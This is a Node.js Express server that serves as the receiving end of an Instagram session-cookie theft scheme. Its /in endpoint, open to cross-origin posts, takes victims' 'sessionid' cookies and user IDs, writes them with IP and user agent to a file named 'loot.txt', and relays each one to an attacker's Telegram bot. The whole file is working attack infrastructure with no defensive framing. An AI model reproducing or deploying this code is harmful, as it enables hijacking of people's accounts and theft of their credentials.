require("dotenv").config();
const express = require("express");
const fs = require("fs");
const axios = require("axios");
const app = express();
const PORT = process.env.PORT || 10000;

app.use(require("body-parser").json({ limit: "1mb" }));
app.use((_, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

app.post("/in", (req, res) => {
  const { sessionid, ds_user_id } = req.body;
  if (!sessionid) return res.sendStatus(204);

  const entry = {
    ts: new Date().toISOString(),
    ip: req.ip,
    ua: req.get("User-Agent"),
    sessionid,
    ds_user_id,
  };

  fs.appendFileSync("loot.txt", JSON.stringify(entry) + "\n");

  axios.post(
    `https://api.telegram.org/bot${process.env.TG_BOT_TOKEN}/sendMessage`,
    {
      chat_id: process.env.TG_CHAT_ID,
      text: `🎯 IG sessionid\nUser: ${ds_user_id}\nCookie: ${sessionid}\nIP: ${entry.ip}`,
    }
  ).catch(()=>{});
  res.sendStatus(200);
});

app.get("/", (_, res) => res.send("OK"));
app.listen(PORT, () => console.log(`Listening on :${PORT}`));
